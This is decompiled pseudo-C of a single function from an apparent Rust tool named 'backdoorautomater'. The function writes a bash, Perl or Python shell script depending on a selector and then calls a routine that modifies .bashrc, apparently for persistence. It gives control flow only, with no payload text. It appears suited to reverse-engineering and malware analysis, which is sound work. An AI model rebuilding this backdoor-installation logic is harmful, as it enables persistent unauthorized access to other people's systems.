
  int64_t backdoorautomater::shellscript::create_script::h6e2940071419697f(int128_t* arg1, int128_t* arg2, int64_t* arg3, int128_t* arg4, char arg5)

{
    char const (** rax)[0x1] = arg3[1];
    void* rcx_1 = arg3[2] + rax;
    char const (** const var_e8)[0x1] = rax;
    void* var_e0 = rcx_1;
    int32_t rax_1 = _$LT$core..str..iter..Chars$u20$as$u20$core..iter..traits..double_ended..DoubleEndedIterator$GT$::next_back::h6ef03064f47cabe8(&var_e8);
    
    if (rax_1 != 0x110000 && rax_1 != 0x2f)
        alloc::string::String::push::h8dfcd488d6c0f12b(arg3);
    
    int64_t var_d8 = arg3[2];
    var_e8 = *arg3;
    int128_t var_d0 = *arg4;
    int64_t var_c0 = arg4[1];
    int128_t var_b8;
    alloc::str::join_generic_copy::h6e3e6eb2fb0da332(&var_b8, &var_e8, 2, 1, 0);
    int128_t var_98 = var_b8;
    int128_t* r13;
    r13 = 1;
    core::ptr::drop_in_place$LT$$u5b$alloc..string..String$u3b$$u20$2$u5d$$GT$::hfd07afc6d277b85d(
        &var_e8);
    void var_48;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_48, 
        arg2);
    int128_t var_60;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_60, 
        &var_98);
    uint32_t rbp_1 = arg5;
    int128_t var_78;
    int64_t rbx;
    int64_t var_a8;
    
    if (rbp_1 == 3)
    {
        int64_t var_68_3 = arg2[1];
        var_78 = *arg2;
        int64_t var_a8_3 = arg1[1];
        var_b8 = *arg1;
        int64_t var_d8_3 = var_a8;
        var_e8 = var_98;
        backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
            backdoorautomater::shellscript::write_shell_bash::hdd5bd13fe6aaa7b7(&var_78, &var_b8, 
            &var_e8));
        rbx = 1;
    }
    else if (rbp_1 == 2)
    {
        int64_t var_68_2 = arg2[1];
        var_78 = *arg2;
        int64_t var_a8_2 = arg1[1];
        var_b8 = *arg1;
        int64_t var_d8_2 = var_a8;
        var_e8 = var_98;
        backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
            backdoorautomater::shellscript::write_shell_perl::h0df48fc72a197687(&var_78, &var_b8, 
            &var_e8));
        rbx = 1;
    }
    else if (rbp_1 != 1)
    {
        r13 = 1;
        rbx = 0;
    }
    else
    {
        int64_t var_68_1 = arg2[1];
        var_78 = *arg2;
        int64_t var_a8_1 = arg1[1];
        var_b8 = *arg1;
        int64_t var_d8_1 = var_a8;
        var_e8 = var_98;
        backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
            backdoorautomater::shellscript::write_shell_pyfile::h0bdea7fe03ab2920(&var_78, &var_b8, 
            &var_e8));
        rbx = 1;
    }
    int64_t var_50;
    int64_t var_d8_4 = var_50;
    var_e8 = var_60;
    backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
        backdoorautomater::shellscript::modify_bashrc::h273b1bb4da291c9b(&var_e8, rbp_1));
    var_e8 = &data_62a7e8;
    int64_t var_e0_1 = 1;
    int64_t var_d8_5 = 8;
    int128_t var_d0_1 = {0};
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_e8);
    var_78 = &var_48;
    var_b8 = &var_78;
    *var_b8[8] = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h79b96a6ad6630cec;
    var_e8 = &data_62a7f8;
    int64_t var_e0_2 = 2;
    *var_d0_1[8] = 0;
    int128_t* var_d8_6 = &var_b8;
    var_d0_1 = 1;
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_e8);
    int64_t result =
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_48);
    
    if (rbx)
        return result;
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    return core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
}
